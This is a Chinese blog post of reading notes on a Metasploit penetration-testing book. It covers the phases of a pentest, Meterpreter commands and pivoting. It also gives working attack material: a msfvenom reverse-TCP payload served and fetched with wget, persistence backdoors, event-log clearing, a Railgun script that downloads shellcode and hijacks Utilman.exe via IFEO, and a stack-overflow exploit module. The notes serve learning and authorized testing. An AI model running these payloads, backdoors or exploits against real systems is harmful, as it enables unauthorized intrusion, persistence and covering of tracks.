

  
    
  


  




  


  

<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hugo 0.29 with theme Tranquilpeak 0.4.1-BETA">
    <title>读书笔记《精通Metasploit渗透测试》</title>
    <meta name="author" content="FreeKnight.Wong">
    <meta name="keywords" content="FreeKnight, duzhi5368, FreeKnight, Blog, duzhi5368">

    <link rel="icon" href="https://duzhi5368.github.io/favicon.png">
    

    
    <meta name="description" content="本想简单记录一点的，一不小心就记录多了。

一边看书过程中，一边 google 明确名词并扩展知识面。

本文主要就是记录如何使用渗透工具Metasploit对目标进行漏洞扫描，渗透，注入攻击载荷并做后渗透破坏工作。

嗯，本书我给打7分吧。有不少干货，但系统性上还缺了些，不足以成为神书。

">
    <meta property="og:description" content="本想简单记录一点的，一不小心就记录多了。

一边看书过程中，一边 google 明确名词并扩展知识面。

本文主要就是记录如何使用渗透工具Metasploit对目标进行漏洞扫描，渗透，注入攻击载荷并做后渗透破坏工作。

嗯，本书我给打7分吧。有不少干货，但系统性上还缺了些，不足以成为神书。

">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="读书笔记《精通Metasploit渗透测试》">
    <meta property="og:url" content="/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
    <meta property="og:site_name" content="The lost island">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="The lost island">
    <meta name="twitter:description" content="本想简单记录一点的，一不小心就记录多了。

一边看书过程中，一边 google 明确名词并扩展知识面。

本文主要就是记录如何使用渗透工具Metasploit对目标进行漏洞扫描，渗透，注入攻击载荷并做后渗透破坏工作。

嗯，本书我给打7分吧。有不少干货，但系统性上还缺了些，不足以成为神书。

">
    
      <meta name="twitter:creator" content="@duzhi5368">
    
    

    
    

    
      <meta property="og:image" content="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=640">
    

    
    
    

    

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
    
    
    <link rel="stylesheet" href="https://duzhi5368.github.io/css/style-fpbzgxsy0kgmdvyrj5ykkg6ratccrk3gocmaqn4xpcjywmv5dteilzucro4f.min.css" />
    
    

    
      
    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://duzhi5368.github.io/">The lost island</a>
  </div>
  
</header>

      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://duzhi5368.github.io/#about">
          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=110" alt="作者的图片" />
        </a>
        <h4 class="sidebar-profile-name">FreeKnight.Wong</h4>
        
          <h5 class="sidebar-profile-bio">Ever tried, ever failed, fail better.</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://duzhi5368.github.io/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">首页</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://duzhi5368.github.io/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">标签</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://duzhi5368.github.io/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">归档</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://duzhi5368.github.io/#about">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">关于</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://duzhi5368.github.io/OLDPAGE/index.html">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">OldPage</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/duzhi5368" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://www.facebook.com/FreeKnight5368" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-facebook-official"></i>
      
      <span class="sidebar-button-desc">Facebook</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://www.flickr.com/photos/158973746@N07" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-flickr"></i>
      
      <span class="sidebar-button-desc">Flickr</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://duzhi5368.github.io/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>


    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="4"
        class="
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title" itemprop="headline">
      读书笔记《精通Metasploit渗透测试》
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time itemprop="datePublished" datetime="2019-10-30T00:00:00Z">
        
  十月 30, 2019

      </time>
    
    
  
  
    <span>发布在</span>
    
      <a class="category-link" href="https://duzhi5368.github.io/categories/%e6%96%87%e5%ad%a6">文学</a>, 
    
      <a class="category-link" href="https://duzhi5368.github.io/categories/2019">2019</a>
    
  


  </div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <p>本想简单记录一点的，一不小心就记录多了。</p>

<p>一边看书过程中，一边 google 明确名词并扩展知识面。</p>

<p>本文主要就是记录如何使用渗透工具Metasploit对目标进行漏洞扫描，渗透，注入攻击载荷并做后渗透破坏工作。</p>

<p>嗯，本书我给打7分吧。有不少干货，但系统性上还缺了些，不足以成为神书。</p>

<p></p>

<h2 id="相关网址汇总">相关网址汇总</h2>

<p><a href="https://www.cvedetails.com/top-50-products.php">CVE数据库</a></p>

<p><a href="https://www.exploit-db.com/exploits/">Exploit-DB</a></p>

<p><a href="https://www.scadahacker.com/resources/msf-scada.html">SCADA系统漏洞</a></p>

<p><a href="http://www.viproy.com">VOIP的渗透测试资料站</a></p>

<p><a href="https://github.com/infobyte/faraday/wiki/Demos">Faraday的一些Demo</a></p>

<p><a href="https://github.com/corelan/mona/">MONA插件</a></p>

<p><a href="https://www.androidauthority.com/how-to-install-kali-nethunter-android-896887/">手机安装Kali nethunter和Metasploit</a></p>

<p><a href="https://www.arduino.cc/en/Guide/Windows">Arduino基本设置说明</a></p>

<p><a href="https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/">SET教程</a></p>

<p><a href="https://rubular.com/">RUBY正则表达式</a></p>

<p><a href="http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf">Cortana语言说明</a></p>

<h2 id="metasploit优势">Metasploit优势</h2>

<p>开源，可便利的对大量网络进行批量测试，可便利的更换攻击载荷。</p>

<h2 id="渗透主要流程">渗透主要流程</h2>

<ol>
<li>前期交互阶段</li>
</ol>

<p>书面明确需求费用，许可范围。时间许可，是否允许社工，DDOS，破坏性的渗透方式，这些比较敏感。</p>

<p>这个阶段，可以使用社工方式从用户处获取更多的附属信息，包括</p>

<ul>
<li>开发运维人员工作时所使用的技术</li>
<li>服务器平台和操作系统的详细信息</li>
<li>隐藏的登录IP地址或管理区域地址</li>
<li>系统的配置和操作系统的详细信息</li>
<li>WEB服务器的后台技术</li>
</ul>

<ol>
<li>信息收集阶段（占时50%）</li>
</ol>

<p>这个阶段，我们需要研究网络配置并从目标网络获取更多信息，包括</p>

<ul>
<li>目标网络技术细节，运行的服务版本等</li>
</ul>

<p>这里依然可以用社工从最终用户，管理员，网络工程师处获取。也可以通过漏洞扫描工具（如Nessus, OpenVAS, GFI局域网卫士等）去获取。</p>

<p>也可以使用例如Google hacking搜索方式去了解对方。（例如 site: intitle: inurl: filetype: &ldquo; + - 等高级搜索）</p>

<p>通过现场信息采集，设备信息检查，丢弃废物收集等以获得对方隐私。</p>

<p>去踩点了解对方安全机制，包括端口扫描，防火墙检查，网络流量过滤防护措施收集等。</p>

<ol>
<li>威胁建模阶段</li>
</ol>

<p>经过漏洞扫描收集，我们可能得到目标机的一些漏洞列表。</p>

<p>从中选择出合适的针对目标的威胁选项，作用，并对其进行分类，并确定最佳的攻击方式。</p>

<ol>
<li>漏洞分析阶段</li>
</ol>

<p>从服务器配置，系统漏洞，到应用程序漏洞，到数据库服务。不停的测试，验证和研究。</p>

<ol>
<li>渗透攻击阶段</li>
</ol>

<p>真正的攻击阶段，通过漏洞获得控制权限。</p>

<ol>
<li>后渗透攻击阶段</li>
</ol>

<p>一般做渗透成功之后的事，例如提权，上传下载文件，跳板攻击，维护身份，掩盖入侵痕迹等。</p>

<ol>
<li>报告阶段</li>
</ol>

<p>记录手段思路流程，提出改进建议和修复方案。</p>

<h2 id="术语">术语</h2>

<p><strong>渗透模块</strong>：Exploit(EXP) 指一段代码。运行该代码可以利用目标漏洞进行攻击。</p>

<p><strong>攻击载荷模块</strong>：Payload 也是一段代码。在对目标成功渗透后，这段程序在目标机进行运行，以得到需要的权限，通常是和建立本机和被渗透机之间的通道，或执行特殊任务。</p>

<p><strong>辅助模块</strong>: Auxiliary 一些支持工具，例如扫描模块，信息采集，Fuzz测试漏洞发觉，网络协议欺骗等。</p>

<p><strong>Meterpreter</strong>: 是一种使用内存技术的攻击载荷，可以注入到进程中。适用范围广，很受欢迎。</p>

<p><strong>编码器模块</strong>： Encoder 用来对代码进行混淆的工具。</p>

<h2 id="基本命令">基本命令</h2>

<pre><code>root@xx:~# msfconsole 启动Metasploit（记得先设置环境变量到bin下）
root@xx:~# msfdbinit 启动Metasploit内置的PostgreSQL
msf&gt; db_status 查看数据库状态
msf&gt; db_connect 连接外部数据库
msf&gt; db_disconnect 断开外部数据库
msf&gt; db_import 从外部导入数据到本工具的数据库中
msf&gt; db_export 将数据库的数据导出，用来生成报告或给他工具使用
msf&gt; db_nmap 直接用nmap扫描并将结果保存在metasploit的数据库中
</code></pre>

<h2 id="标准样板渗透流程">标准样板渗透流程</h2>

<pre><code>msf&gt; db_nmap -sV 192.1.1.1   // 得到目标主机开放端口和服务
msf&gt; services -u // 查看目标机当前服务
msf&gt; hosts // 获取数据库中的所有主机
// 假设我们发现目标机开启了 21端口的FTP服务。其信息为  vsftpd 2.3.4
msf&gt; search vsftpd // 查看这个版本的服务是否有什么EXP漏洞
// 假设我们发现它确实有个漏洞叫做 exploit/unix/ftp/vsftpd_234_backdoor
msf&gt; use exploit/unix/ftp/vsftpd_234_backdoor // 使用该EXP
msf&gt; explosit(vsftpd_234_backdoor)&gt; info  // 查看该EXP信息
msf&gt; explosit(vsftpd_234_backdoor)&gt; show options // 查看该EXP的选项，发现有RHOST和RPORT两个选项参数
msf&gt; explosit(vsftpd_234_backdoor)&gt; set RHOST 192.1.1.1 // 设置EXP选项1
msf&gt; explosit(vsftpd_234_backdoor)&gt; set RPORT 21 // 设置EXP选项2
msf&gt; explosit(vsftpd_234_backdoor)&gt; show payloads // 查看使用本渗透模块的攻击载荷，假设得到一个有效攻击载荷叫 cmd/unix/interact
msf&gt; explosit(vsftpd_234_backdoor)&gt; set payload cmd/unix/interact // 设置攻击载荷
msf&gt; explosit(vsftpd_234_backdoor)&gt; exploit // 执行攻击
</code></pre>

<h2 id="辅助库-辅助功能">辅助库/辅助功能</h2>

<pre><code>// 获取指定IP的端口情况
msf&gt; use auxiliary/scanner/portscan/tcp
msf&gt; auxiliary(tcp)&gt; show options
msf&gt; auxiliary(tcp)&gt; set RHOSTS 129.1.1.1
msf&gt; auxiliary(tcp)&gt; run
// 检查80端口状况
msf&gt; use auxiliary/scanner/http/http_version
msf&gt; auxiliary(http_version)&gt; show options
msf&gt; auxiliary(http_version)&gt; set RHOSTS 129.1.1.1
msf&gt; auxiliary(http_version)&gt; run
// 检查指定版本模块的漏洞情况
msf&gt; search &quot;php 5.2.4&quot;  // 就可以得到漏洞列表
// 然后就可以继续重复 **标准样板渗透流程** 了
</code></pre>

<h2 id="meterpreter样板渗透流程">Meterpreter样板渗透流程</h2>

<pre><code>// 以下创建一个Meterpreter攻击载荷，其中-p后面是攻击载荷，LHOST,LPORT是payload参数（本机IP和端口）， -f  定义了输出文件类型。-o 表明了payload保存路径。
// msfvenom命令参数在网上建议仔细了解。
root@xx:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=129.0.0.1 LPORT=801 -f exe -o /Users/xxxx/downloads/xxoo.exe
// 然后将创建出来的payload传输到目标机器上，例如本地开启Apache
root@xx:~# service apache2 start
root@xx:~# mv xxoo.exe /var/www/html/
// 然后在刚才进入的目标机中下载该payload
root@target:~# wget http://129.0.0.1/xxoo.exe
// 下载完成后，提供一个权限
root@target:~# chmod 777 xxoo.exe
// 我们的Payload到了目标机后，需要通过渗透模块控制程序Handler进行互相通信
msf&gt; use exploit/mutil/handler
msf exploit(handler)&gt; show payloads // 查看这个EXP对应的payloads
msf exploit(handler)&gt; set payload windows/meterpreter/reverse_tcp
msf exploit(handler)&gt; set LPORT 801
msf exploit(handler)&gt; set LHOST 129.0.0.1
msf explosit(handler)&gt; exploit // 执行攻击
Meterpreter&gt;  // 此时我们已经取得了目标系统的Meterpreter权限。然后自由发挥了，例如
Meterpreter&gt; sysinfo // 查看目标机系统信息
Meterpreter&gt; ifconfig // 查看目标机网卡信息
Meterpreter&gt; arp // 查看目标机与哪些机器进行了连接
// 其他等等操作不说明了，最后可以用background命令将这个Meterpreter放置在后台
Meterpreter&gt; background
// 可以用hosts查看Meterpreter
msf explosit(handler)&gt; hosts
</code></pre>

<h2 id="meterpreter常见命令">Meterpreter常见命令</h2>

<pre><code>Meterpreter&gt; getwd // 获取工作目录
Meterpreter&gt; upload -h // 上传文件或文件夹到目标机
Meterpreter&gt; download // 下载文件或文件夹到本机
Meterpreter&gt; search -h // 在目标机上搜索文件
Meterpreter&gt; portfwd // 在部分端口仅允许内网访问时，做端口转发
Meterpreter&gt; route // 查看路由
Meterpreter&gt; ps // 查看进程状况
Meterpreter&gt; migrate // 将Meterpreter会话从一个进程移植到另一个进程的内存空间，只要进程不死Meterpreter就不会断，用来保护Meterpreter的最大寿命
Meterpreter&gt; execute // 在目标机上执行指定文件
Meterpreter&gt; run persistence // 会在目标机上安装一个恶意的VBS脚本并自动启动，在目标机上开启永久后门，实现访问的持久化。之后执行exploit/multi/handler进行通用渗透handler，就可以进行再连接了。
Meterpreter&gt; run event_manager -c // 清除事件管理器日志
Meterpreter&gt; clearv // 清除目标系统的事件日志
</code></pre>

<h2 id="ruby编写自定义模块">Ruby编写自定义模块</h2>

<pre><code>// 常用遍历
def my_func(a)
  a.each do |i|
    print i.to_s + &quot;\t&quot;
  end
end
a = Array.new(5)
a = [1,2,3,4,5]
my_func(a)

// 正则表达式
[RUBY正则表达式](https://rubular.com/)

// Metasploit中的打印函数
print_good(&quot;111&quot;)       // [+]111 绿色，表示正常
print_status(&quot;111&quot;)     // [*]111 蓝色，表示信息
print_error(&quot;111&quot;)      // [-]111 红色，表示错误

// 通用Metasploit框架
require 'msf/core'
class Metasploit5 &lt; Msf::Auxiliary // 继承哪些模块，可继承Msf::Post等等模块
  include Msf::Axuiliary::Scanner // 包含头，可调整
  def initialize
    super('Name' =&gt; 'Module name',
      'Description' =&gt; '这是描述文字',
      'Author' =&gt; 'Name',
      'License' =&gt; MSF_LICENSE)
    register_options(
      [Opt::RPORT(21), ] // 参数，可调整
    )
  end
  def run_host(params)
    # 自己的核心逻辑
  end
end

// 编写完自己的模块rb文件后，要使用msftidy进行代码检查
root@xx:~# /usr/share/metasploit-framework/tools/dev/msftidy.rb /usr/share/metasploit-framework/myXXOOXX.rb
</code></pre>

<h2 id="跳板攻击">跳板攻击</h2>

<pre><code>1. 首先渗透进入A的计算机。
2. 通过A的计算机安装的Meterpreter添加一条从A访问B（限制仅允许A访问）的一个路由项。
使用 autoroute
3. 建立socks代理服务器，让所有网络流量通过Meterpreter发送到A的计算机上。
使用 auxiliary/server/socks4a
4. 根据建立的socks代理服务器重新配置本机系统的代理设置文件。
修改Proxychains.conf
5. 将浏览器的代理地址设置为socks的地址。
6. 这样就达成了所有访问，别人会认为是A发出的假象。
</code></pre>

<h2 id="权限持久化">权限持久化</h2>

<pre><code>一个是使用之前的 persistence，它会在目标机上安装一个恶意的VBS脚本并自动启动，定期尝试和外界的指定IP端口进行通讯，类似反向代理。
解决方案：删除注册表中的值和上传的VBScript文件，该持久化就无效了。
特点：因为是主动向外界连接，防火墙阻挡概率低；但因为需要写入注册表并创建文件，容易被杀掉。
开启方式：Meterpreter&gt; run persistence  // 参数较多，上网查一下
再连接方式： 使用exploit/mutil/handler这个EXP，再用windows/meterpreter/reverse_tcp这个payload，设置IP端口就可以等待连接了（一般是10s会被连接）。

一个是使用MetSVC，它会在目标机上注册一个服务，开机自动启动，这个服务器会等待连接。
特点：任何人都可以用这个后门连接访问服务器，但因为是等待连接，可能连接时被防火墙挡掉；启动服务时还需要管理员权限。
开启方式： Meterpreter&gt; run metsvc -A    // 一般端口会是31337
移除方式： Meterpreter&gt; run metsvc -r
再连接方式： 使用exploit/mutil/handler这个EXP，再用windows/metsvc_bind_tcp这个payload，设置IP端口就可以连接了。
</code></pre>

<h2 id="利用railgun制作meterpreter">利用RailGun制作Meterpreter</h2>

<pre><code>Meterpreter核心机理就是调用mixins类的API，通过它调用Windows动态链接库和其他一些Ruby模块。

想不编译DLL就调用windows系统DLL，就需要使用RailGun，它属于Ruby，不属于Meterpreter。

// 从Meterpreter进入Ruby命令行，需要如下命令
meterpreter&gt; irb

// 进入irb的ruby命令行后，调用系统dll，例如下面是系统锁定
&gt;&gt; client.railgun.user32.LockWorkStation()

// 进行ruby编码如下，并将如下代码保存为 urlmon.rb 存放到 /scripts/meterpreter 中
if client.railgun.get_dll('urlmon') == nil
    print_status(&quot;add function&quot;)
end
client.railgun.add_dll('urlmon', 'c:\\windows\\system32\\urlmon.dll')
client.railgun.add_function('urlmon', 'URLDownloadToFileA', 'DWORD',[
    ['DWORD', 'pcaller', 'in'],
    ['PCHAR', 'szUrl', 'in'],
    ['PCHAR', 'szFileName', 'in'],
    ['DWORD', 'Reserved', 'in'],
    ['DWORD', 'lpfnCB', 'in'],
])

// 上面的代码就将一个win32系统API注册给了Meterperter使用，该方法可以进行文件下载。然后我们编写一个railgun-demo.rb脚本进行映像劫持（IFEO），期间我们使用这个API。
client.railgun.urlmon.URLDownloadToFileA（0, &quot;http://192.0.0.1/shellcode.exe&quot;, &quot;C:\\windows\\system32\\shellcode.exe&quot;, 0, 0）  // API调用，下载木马EXE文件到system32中
key=&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe&quot;
syskey=registry_createkey(key) // 注册表下创建一个注册表键
registry_setvaldata(key, 'debugger', 'shellcode.exe', 'REG_SZ') // 将辅助工具管理器替换为shellcode的注册表键

// 然后我们执行
meterperter&gt; run urlmon // 执行注册API脚本
meterperter&gt; run railgun_demo // 执行映像劫持（IFEO）
之后我们登录时，只要点【访问】按钮，就会调用我们的shellcode.exe
</code></pre>

<h2 id="渗透基本概念">渗透基本概念</h2>

<h5 id="渗透的核心操作的是以下部分">渗透的核心操作的是以下部分</h5>

<ul>
<li>EIP （Extended Instruction Pointer）指令指针寄存器</li>
<li>ESP （Extended Stack Pointer）栈指针寄存器</li>
<li>NOP （No operation）空操作指令 \x90</li>
<li>JMP （Jump）跳转指令</li>
</ul>

<h5 id="cpu主要组成部分">CPU主要组成部分</h5>

<ul>
<li>CU （Control Unit）控制单元。负责对指令的接受和译码工作，并将数据存储到内存中</li>
<li>EU （Execution Unit）执行单元。负责真正的执行过程</li>
<li>Register 寄存器。用来辅助系统执行的存储组件

<ul>
<li>EAX 32位 负责存储数据和操作数的累加器，通常函数返回值也会通过这个寄存器传输</li>
<li>EBX 32位 基地址寄存器，指向数据的指针</li>
<li>ECX 32位 用来实现循环的计数器</li>
<li>EDX 32位 用来保存I/O指针</li>
<li>ESI 32位 索引寄存器，内存运算时的数据指针</li>
<li>EDI 32位 索引寄存器，内存运算时的数据指针</li>
<li>ESP 32位 保存栈顶位置，当有元素进栈出栈时，ESP的值会更变</li>
<li>EBP 32位 栈数据指针寄存器</li>
<li>EIP 32位 指令指针寄存器，它保存了下一个指令的地址（渗透主要工作寄存器）</li>
<li>SS,DS,ES,CS,FS,GS 16位 段寄存器</li>
</ul></li>
</ul>

<h5 id="linux程序内存分布图">Linux程序内存分布图</h5>

<pre><code>  【高地址】

   0xffffffff
        【内核区】
   0xc0000000
        【调用栈区】 ↓向低地址增长
   ???
        【动态链接库区】 固定大小
   ??? + sizeof(动态链接库区)
        【堆区】    ↑向高地址增长
   0x08048000 + sizeof(只读区) + sizeof(读/写区)
        【读/写区】  固定大小
   0x08048000 + sizeof(只读区)
        【只读区】   固定大小
   0x08048000
        【保留区】
   0x00000000
     
  【低地址】
</code></pre>

<h5 id="函数调用栈内存分布">函数调用栈内存分布</h5>

<p>函数调用栈是当程序运行时，内存的一段连续区域，用来保存函数的状态信息，包括参数，局部变量等。</p>

<p>称之为“栈”是因为其插入顺序是，调用函数先被保存在栈内（栈底，高地址），被调用函数的状态被压入栈顶（低地址）。函数调用结束时，栈顶（低地址）的函数被弹出。</p>

<p>函数调用栈从高地址向低地址增长，所以栈顶（低地址）的内存地址，在压栈时变小，退栈时变大。</p>

<pre><code>  【高地址】

   main函数
   被调用函数
   进一步被调用的函数
   &lt;- 在这里插入新的被调用函数; 调用结束时，从这里弹出被调用函数
     
  【低地址】
</code></pre>

<p>负责函数栈内存管理的寄存器包括 <strong>ESP</strong>(Extended stack pointer), <strong>EBP</strong>（Extended base pointer）, <strong>EIP</strong>(Extended instruction pointer)。</p>

<ul>
<li><p>其中ESP保存函数调用栈的栈顶地址（低地址），在压栈退栈时会不停变化。</p></li>

<li><p>EBP保存当前正在执行的函数的基地址（本函数的高地址），在当前函数执行过程中，不会变化，用它可以快速索引函数参数或局部变量位置。</p></li>

<li><p>EIP保存的下一条指令的地址，通过EIP，程序可以连续执行指令。（强调，EIP是汇编指令级的，不是源代码函数级别的，也不是源代码行数级的）</p></li>
</ul>

<p>函数栈状态如下：</p>

<pre><code>
  【高地址】
  
   -- 调用者栈 形参N
   -- ...
   -- 调用者栈 形参2
   -- 调用者栈 形参1  【该值为 EBP+8】
   -- 调用者栈 返回地址【该值为 EBP+4】，也就是调用者函数执行完成后，应该去进行访问地址
   -- 当前函数栈 函数的基地址   &lt;- 此时EBP值指向这里
   -- 当前函数栈 局部变量N
   -- ...
   -- 当前函数栈 局部变量2
   -- 当前函数栈 局部变量1
   -- 当前函数栈 其他寄存器的值
   -- 当前函数栈 形参N
   -- ...
   -- 当前函数栈 形参2
   -- 当前函数栈 形参1
   -- 当前函数栈 返回地址 &lt;- ESP值永远指向栈顶
   
  【低地址】
  
  
  我们对其中一部分做简化
  
  ----&gt; 栈内存从低到高 ----&gt;
  | 局部变量 | EBP | 返回地址 | 形参 |
</code></pre>

<h5 id="asm看函数栈内存分布">ASM看函数栈内存分布</h5>

<p>例如如下代码：</p>

<pre><code>;;  int sum(int a, int b) {
;;      return s;
;;  }
 
push ebp  ; 保存调用函数的基地址
mov ebp, esp ; 保存sum函数的基地址到ebp中，此时ebp为当前sum函数基地址
mov edx, DWORD PTR [ebp+0x8]  ; 读取栈中的参数 1
mov eax, DWORD PTR [ebp+0xc]  ; 读取栈中的参数 2
add eax, edx    ; 1 + 2 保存结果到eax中
pop ebp ; ebp数据出栈
ret ； 结束sum函数，回到调用处，此时eax中存储返回值
</code></pre>

<h2 id="内存溢出渗透">内存溢出渗透</h2>

<p>我们进行内存溢出渗透时需要做的事情</p>

<ol>
<li><p>找到用户输入的填充区，然后填充满这个缓冲区，再覆盖其后的EBP寄存器，就能达到EIP寄存器。这个填充长度称为偏移量。</p></li>

<li><p>重写EIP寄存器地址。通常是一个JMP ESP指令，让程序跳转到payload函数所在地址。</p></li>

<li><p>最后我们要审查一下填充数据中没有一些会引起异常的字符，例如&rdquo;0x00&rdquo;可能会导致该字符在网络传输过程中导致缓冲结束，应当去除它。</p></li>
</ol>

<p>首先，我们使用pattern_create工具测试偏移量。</p>

<pre><code>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_crearte.rb 1000 

它会生成如下字符串 “Aa0Aa1Aa2Aa3....Ab0Ab1Ab2...Ba0Ba1...”
</code></pre>

<p>我们将上述字符串输入到带漏洞的应用程序中，可以得到报错，其中的内存地址就是EIP的地址 0x832b2a81。</p>

<p>再通过pattern_offset工具可计算得到偏移量。</p>

<pre><code>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb 832b2a81 1000 

它会输出如下 “Exact macth at offset 387”
</code></pre>

<p>所以，在387个字节之后的 4个字节 内容会被复写到EIP寄存器中。</p>

<p>为了填充偏移量，那么就推荐使用空指令进行填充，该指令为 \x90，它不执行任何操作，仅顺序执行到下一个地址。使用其他字符填充，可能会引发不可预估的异常。</p>

<p>既然我们的目的是将EIP地址指向我们的Shellcode地址。那么只要</p>

<pre><code>  ----&gt; 栈内存从低到高 ----&gt;
  | 局部变量 | EBP | 返回地址 | 形参 |
  
  改成
  
    ----&gt; 栈内存从低到高 ----&gt;
  | x90x90x90... | x90x90x90... | 我们Shellcode的地址 | x90x90x90.. |
  
</code></pre>

<p>就可以达成输入完之后，EIP就会修改为我们shellcode地址并进一步执行。</p>

<h5 id="jmp-esp">JMP ESP</h5>

<p>但shellcode存放在哪儿呢？我们可以硬编码到一个有执行权限的地址，但这样的&rdquo;硬地址&rdquo;很不安全，于是我们推荐使用一种相对定位shellcode地址的方法，称之为 <strong>“JMP ESP”</strong>。</p>

<p>它利用了一个栈顶指针ESP的特性：当函数结束，执行ret指令时，我们ESP寄存器在内存释放时，逐步指向栈顶</p>

<pre><code>    ----&gt; 栈内存从低到高 ----&gt;
  | x90x90x90... | x90x90x90... | JMP ESP命令所在的地址 | shellcode |
        这块内存都被释放了        | &lt;- ESP所在地
</code></pre>

<p>此时我们若将原本shellcode所在地址，改成程序中某处 &ldquo;JMP ESP&rdquo;命令所在地址的话，后果将是ESP释放这个地址，并指向后面的shellcode部分，而EIP将会去执行那处&rdquo;JMP ESP&rdquo;命令，导致EIP去执行ESP指向的shellcode部分。</p>

<p>所以步骤是：</p>

<ol>
<li>首先查找程序中原本任何一处存在的JMP ESP命令地址</li>
</ol>

<pre><code>root@kali:/usr/share/metasploit-framework# msfbinscan -j esp /root/myexe.dll

得到 0x71ac73b1 push esp; ret
</code></pre>

<ol>
<li><p>然后我们将 0x71ac73b1 这个地址，设置到上面的 387 字节偏移量之后（用0x90填充），然后，在这 387 + 4 字节之后加入shellcode即可。</p></li>

<li><p>但还有个问题，大部分情况下，<strong>“ 返回地址 | 形参 ”</strong> 中间有可能间隔一些区域。换成最后那张图，即意味着 <strong>“JMP ESP命令所在的地址 | shellcode”</strong> 之间可能存在一些区域，此时需要使用immunity调试器对ESP寄存器中内容做一些监视以确定间隔大小，再用NOP（0x90）填补。</p></li>
</ol>

<h4 id="编写metasploite内存渗透模块">编写Metasploite内存渗透模块</h4>

<pre><code>    require 'msf/core'
    class Metasploit5 &lt; Msf::Exploit::Remote // 继承自远程渗透模块
      Rank = NormalRanking
      include Msf::Exploit::Remote::Tcp // 支持库
      def initialize(info = {})
        super(update_info(info, 
            'Name' =&gt; 'Stack based buffer overflow',
            'Description' =&gt; 'Test exp module',
            'Platform' =&gt; 'win', // 本模块可适用的平台
            'Author' =&gt; ['FK'],
            'Payload' =&gt; {
                'space' =&gt; 1000, // 攻击载荷shellcode允许的最大空间
                'BadChars' =&gt; '\x00\xff', // 可能出现的异常字符
            },
            'Targets' =&gt; [
                ['Windows XP SP2', {'Ret' =&gt; 0x71ac73b1, 'Offset' =&gt; 387}] // JMP ESP地址 和 前置偏移量
            ],
            'DisclosureDate' =&gt; 'Oct 30 2019' // 漏洞发现时间
        ))
        register_options(
            [Opt::RPORT(200)],
            self.class
        )
      end
      
      def exploit   // 该函数类似于辅助模块的默认函数run
        // 自己的逻辑代码，例如
        connect
        buf = make_nops(target['Offset'])
        buf = buf + [target['Ret']].pack('V') + make_nops(10) + payload.encoded
        sock.put(buf)
        handler
        disconnect
      end
    end
</code></pre>

